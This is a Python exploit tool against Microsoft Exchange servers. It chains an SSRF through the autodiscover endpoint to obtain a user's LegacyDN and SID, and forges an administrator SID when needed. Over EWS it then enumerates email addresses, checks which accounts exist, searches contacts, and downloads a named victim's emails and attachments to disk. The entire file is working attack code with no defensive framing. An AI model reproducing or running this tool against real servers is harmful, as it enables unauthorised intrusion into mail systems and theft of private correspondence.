#coding:utf-8
#author:Jumbo

import requests
from urllib3.exceptions import InsecureRequestWarning
import logging
import argparse
from string import Template
import xml.etree.cElementTree as ET
from base64 import b64decode, b64encode
import os
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)




def GetLegacyDN(target,email):
    logger.debug("[Stage 1] Performing SSRF attack against Autodiscover")
    autoDiscoverBody = convertFromTemplate({'email':email},templatesFolder + "GetLegacyDN.xml")
    stage1 = requests.post(f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json?a=a@edu.edu", headers={
        "Content-Type": "text/xml",
        "User-Agent": user_agent},
                           data=autoDiscoverBody,
                           verify=False
                           )
    # If status code 200 is NOT returned, the request failed
    if stage1.status_code != 200:
        logger.error("[Stage 1] Request failed - Autodiscover Error!")
        exit()

    # If the LegacyDN information is not in the response, the request failed as well
    if "<LegacyDN>" not in stage1.content.decode('utf8').strip():
        logger.error("[Stage 1] Cannot obtain required LegacyDN-information!")
        exit()

    # Define LegacyDN for further use in the script
    legacyDn = stage1.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]

    #print("[Stage 1] Successfully obtained DN: " + legacyDn)
    return legacyDn


def GetSID(target, legacyDn):
    logger.debug("[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against " + target)

    # Malformed MAPI body
    mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    # Send the request
    stage2 = requests.post(f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json?a=a@edu.edu",
        headers={
        "Content-Type": "application/mapi-http",
        "User-Agent": user_agent,
        "X-RequestId": "1337",
        "X-ClientApplication": "Outlook/15.00.0000.0000",
        # The headers X-RequestId, X-ClientApplication and X-requesttype are required for the request to work
        "x-requesttype": "connect"},
                           data=mapi_body,
                           verify=False
                           )

    if stage2.status_code != 200 or "act as owner of a UserMailbox" not in stage2.content.decode('cp1252').strip():
        logger.error("[Stage 2] Mapi Error!")
        exit()

    sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
    logger.debug("[Stage 2] Successfully obtained SID: " + sid)
    return sid


def GetMails(target):
    logger.debug("[Stage 444] Get 100 email users")
    soap_body = convertFromTemplate({},templatesFolder + "GetMails.xml")
    stage444 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu"
                            },
        data=soap_body,
        verify=False
        )
    # If status code 200 is NOT returned, the request failed
    if stage444.status_code != 200:
        logger.error("[Stage 444] Get 100 email users Error!")
        exit()
    folderXML = ET.fromstring(stage444.content.decode())
    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
        print(f"Email Address  : {item.text}")



def Brute_Account(target,email):
    # logger.debug("[Stage 999] Brute Account With EWS ")
    soap_body = convertFromTemplate({'email':email},templatesFolder + "Brute_Account.xml")
    stage999 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu"
                            },
        data=soap_body,
        verify=False
        )
    # If status code 200 is NOT returned, the request failed
    if stage999.status_code != 200:
        logger.error("[Stage 999] Request failed - Brute Account Error!")
        exit()
    # print(stage999.content.decode())
    if "Check credentials and try again" in stage999.content.decode():
        print(f"{email} valid")


def SearchContact(target,sid,keyword):
    logger.debug("[Stage 888] Search Contact With ews/exchange.asmx ")
    soap_body = convertFromTemplate({'sid':sid,'keyword':keyword},templatesFolder + "SearchContact.xml")
    stage888 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                            },
        data=soap_body,
        verify=False
        )
    # If status code 200 is NOT returned, the request failed
    if stage888.status_code != 200:
        logger.error("[Stage 999] Request failed - Search Contactt Error!")
        exit()
    if "No results were found" in stage888.content.decode():
        logger.warning("No results were found, try fix sid")
        if sid.split("-")[-1] != "500":
            logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
            base_sid = sid.split("-")[:-1]
            base_sid.append("500")
            sid = "-".join(base_sid)
    soap_body = convertFromTemplate({'sid':sid,'keyword':keyword},templatesFolder + "SearchContact.xml")
    stage888 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                            },
        data=soap_body,
        verify=False
        )
    # If status code 200 is NOT returned, the request failed
    if stage888.status_code != 200:
        logger.error("[Stage 999] Request failed - Search Contact Error!")
        exit()
    folderXML = ET.fromstring(stage888.content.decode())
    if "No results were found" in stage888.content.decode():
        logger.warning("No results were found")
    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
        print(item.text)


def DownloadEmails(target, sid,folder):
    logger.debug("[Stage 777] Get Mails Stage 1 Finditem ing... ")
    FindItem_body = convertFromTemplate({'sid':sid,'folder':folder},templatesFolder + "FindItem.xml")
    FindItem_request = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                            },
        data=FindItem_body,
        verify=False
        )
    # If status code 200 is NOT returned, the request failed
    if FindItem_request.status_code != 200:
        logger.error("[Stage 777] Request failed - Get Mails Stage 1 Finditem Error!")
        exit()
    folderXML = ET.fromstring(FindItem_request.content.decode())
    i = 0
    for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
        params = {'sid':sid,'Id': item.get('Id'), 'ChangeKey': item.get('ChangeKey')}
        logger.debug("[Stage 777] Get Mails Stage 2 GetItem ing... ")
        GetItem_body = convertFromTemplate(params, templatesFolder + "GetItem.xml")
        GetItem_request = requests.post(
            f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
                "Content-Type": "text/xml",
                "User-Agent": user_agent,
                "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                                },
            data=GetItem_body,
            verify=False
            )   
        if GetItem_request.status_code != 200:
            logger.error("[Stage 777] Request failed - Get Mails Stage 2 GetItem Error!")
            exit()
        itemXML = ET.fromstring(GetItem_request.content.decode())
        mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text
        logger.debug("[Stage 777] Get Mails Stage 3 Downloaditem ing... ")
        try:
            extension = "eml"
            outputDir = "output"
            if not os.path.exists(outputDir):
                os.makedirs(outputDir)
            fileName = outputDir + "/item-{}.".format(i) + extension
            with open(fileName, 'wb+') as fileHandle:
                fileHandle.write(b64decode(mimeContent))
                fileHandle.close()
                print("[+] Item [{}] saved successfully".format(fileName))
        except IOError:
            print("[!] Could not write file [{}]".format(fileName))
        DownAttachment(target,sid,item.get('Id'),i)
        i = i + 1


def DownAttachment(target, sid,id,i):
    logger.debug("[Stage 555] Ready Download Attachmenting... ")
    params2 = {'sid':sid,'Id': id}
    GetItem_body = convertFromTemplate(params2, templatesFolder + "GetAttachmentID.xml")
    GetItem_request = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                            },
        data=GetItem_body,
        verify=False
        )
    logger.debug("[Stage 555] Determine if there are attachments in the email... ")
    if "AttachmentId" in GetItem_request.content.decode():
        itemXML = ET.fromstring(GetItem_request.content.decode())
        logger.debug("[Stage 555] This Mail Has Attachment... ")
        AttachmentIds = itemXML.findall(".//t:AttachmentId", exchangeNamespace)
        for AttachmentId in AttachmentIds:
            # print(AttachmentId.get('Id'))
            logger.debug("[Stage 555] Start Get Attachment Content... ")
            Attachment_body = convertFromTemplate({'sid':sid,'AttachmentId':AttachmentId.get('Id')},templatesFolder + "GetAttachmentbody.xml")
            Attachment_request = requests.post(
                f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
                    "Content-Type": "text/xml",
                    "User-Agent": user_agent,
                    "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                                    },
                data=Attachment_body,
                verify=False
                )
            AttachmentXML = ET.fromstring(Attachment_request.content.decode())
            AttachmentXMLname = AttachmentXML.find(".//t:Name", exchangeNamespace).text
            if "<t:Content>" in Attachment_request.content.decode():
                AttachmentXMLcontent = AttachmentXML.find(".//t:Content", exchangeNamespace).text
                logger.debug("[Stage 555] Start Download Attachment... ")
                try:
                    outputDir = "output"
                    if not os.path.exists(outputDir):
                        os.makedirs(outputDir)
                    fileName = outputDir + "/item-{}-".format(i) + AttachmentXMLname
                    with open(fileName, 'wb+') as fileHandle:
                        fileHandle.write(b64decode(AttachmentXMLcontent))
                        fileHandle.close()
                        print("[+] Item [{}] saved successfully".format(fileName))
                except IOError:
                    print("[!] Could not write file [{}]".format(fileName))
            elif "</t:Body>" in Attachment_request.content.decode():
                AttachmentXMLcontent = AttachmentXML.find(".//t:Body", exchangeNamespace).text
                logger.debug("[Stage 555] Start Download Attachment With Body... ")
                try:
                    outputDir = "output"
                    if not os.path.exists(outputDir):
                        os.makedirs(outputDir)
                    fileName = outputDir + "/item-{}-".format(i) + AttachmentXMLname
                    with open(fileName, 'wb+') as fileHandle:
                        fileHandle.write(AttachmentXMLcontent.encode())
                        fileHandle.close()
                        print("[+] Item [{}] saved successfully".format(fileName))
                except IOError:
                    print("[!] Could not write file [{}]".format(fileName))
            else:
                logger.warning("Attachment ERROR ,Download Failed!")





def SearchMails(target, sid,folder,keyword):
    logger.debug("[Stage 666] Search Mails Stage 1 Finditem ing... ")
    FindItem_body = convertFromTemplate({'sid':sid,'folder':folder,'keyword':keyword},templatesFolder + "SearchMails.xml")
    FindItem_request = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                            },
        data=FindItem_body.encode('utf-8'),
        verify=False
        )
    # If status code 200 is NOT returned, the request failed
    if FindItem_request.status_code != 200:
        logger.error("[Stage 666] Request failed - Search Mails Stage 1 Finditem Error!")
        exit()
    folderXML = ET.fromstring(FindItem_request.content.decode())
    i = 0
    for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
        params = {'sid':sid,'Id': item.get('Id'), 'ChangeKey': item.get('ChangeKey')}
        logger.debug("[Stage 666] Get Mails Stage 2 GetItem ing... ")
        GetItem_body = convertFromTemplate(params, templatesFolder + "GetItem.xml")
        GetItem_request = requests.post(
            f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
                "Content-Type": "text/xml",
                "User-Agent": user_agent,
                "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
                                },
            data=GetItem_body,
            verify=False
            )   
        itemXML = ET.fromstring(GetItem_request.content.decode())
        mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text
        logger.debug("[Stage 666] Search Mails Stage 3 Downloaditem ing... ")
        try:
            extension = "eml"
            outputDir = "output"
            if not os.path.exists(outputDir):
                os.makedirs(outputDir)
            fileName = outputDir + "/{}-item-{}.".format(keyword,i) + extension
            with open(fileName, 'wb+') as fileHandle:
                fileHandle.write(b64decode(mimeContent))
                fileHandle.close()
                print("[+] Item [{}] saved successfully".format(fileName))
        except IOError:
            print("[!] Could not write file [{}]".format(fileName))
        DownAttachment(target,sid,item.get('Id'),i)
        i = i + 1


def convertFromTemplate(shellcode, templateFile):
    try:
        with open(templateFile) as f:
            src = Template(f.read())
            result = src.substitute(shellcode)
            f.close()
            return result
    except IOError as e:
        print("[!] Could not open or read template file [{}]".format(templateFile))
        return e


#=========================================================================================
# GLOBAL CONFIG
#=========================================================================================
templatesFolder = "ews_template/"
# exchangeVersion = "Exchange2010_SP2"
exchangeNamespace = {'m': 'http://schemas.microsoft.com/exchange/services/2006/messages', 't': 'http://schemas.microsoft.com/exchange/services/2006/types'}
user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36."


if __name__ == '__main__':
    
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    parser = argparse.ArgumentParser()
    parser.add_argument('--target',required=True, help='the target Exchange Server ip')
    parser.add_argument('--email', help='victim email')
    parser.add_argument('--action',required=True,choices=['Get','Brute','SearchC','SearchM','Download'], help='The action you want to take')
    parser.add_argument("--file", help="email files with your want brute accounts")
    parser.add_argument("--keyword", help="keyword with you want search")
    parser.add_argument("--folder",default="inbox", help="folder name with you want download")
    args = parser.parse_args()

    if args.target and args.action == "Brute" and args.file:
        logger.debug("[Stage 999] Brute Account With EWS")
        with open(args.file) as f:
            for emails in f.readlines():
                email = emails.strip()
                Brute_Account(args.target, email)
    elif args.target and args.action == "Get":
        emails = GetMails(args.target)

    elif args.target and args.email and args.action == "SearchC" and args.keyword:
        legacyDn = GetLegacyDN(args.target, args.email)
        sid = GetSID(args.target, legacyDn)
        contactinfo = SearchContact(args.target, sid, args.keyword)
        
    elif args.target and args.email and args.action == "SearchM" and args.folder and args.keyword:
        legacyDn = GetLegacyDN(args.target, args.email)
        sid = GetSID(args.target, legacyDn)
        mailsresult = SearchMails(args.target, sid, args.folder,args.keyword)

    elif args.target and args.email and args.action == "Download" and args.folder:
        legacyDn = GetLegacyDN(args.target, args.email)
        sid = GetSID(args.target, legacyDn)
        emailsresult = DownloadEmails(args.target, sid, args.folder)
    